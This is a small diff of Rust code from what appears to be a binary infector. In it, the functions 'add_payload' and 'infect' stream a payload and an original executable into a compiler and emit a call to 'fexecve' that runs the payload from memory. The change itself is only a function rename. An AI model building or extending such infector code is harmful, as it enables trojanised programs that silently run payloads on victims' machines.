@@ -33,7 +33,7 @@ pub async fn add_payload(compiler: &mut rust::Compiler, payload: &Payload<'_>) -
                 ])
                 .await?;
 
-            rust::stream_bin(payload, &mut compiler.stdin).await?;
+            rust::stream_bin_std(payload, &mut compiler.stdin).await?;
             compiler
                 .add_lines(&["unsafe { fexecve(f.as_raw_fd(), argv.as_ptr(), environ) };\n"])
                 .await?;
@@ -113,7 +113,7 @@ pub async fn infect(
         ])
         .await?;
 
-    rust::stream_bin(orig, &mut compiler.stdin).await?;
+    rust::stream_bin_std(orig, &mut compiler.stdin).await?;
 
     compiler
         .add_lines(&[
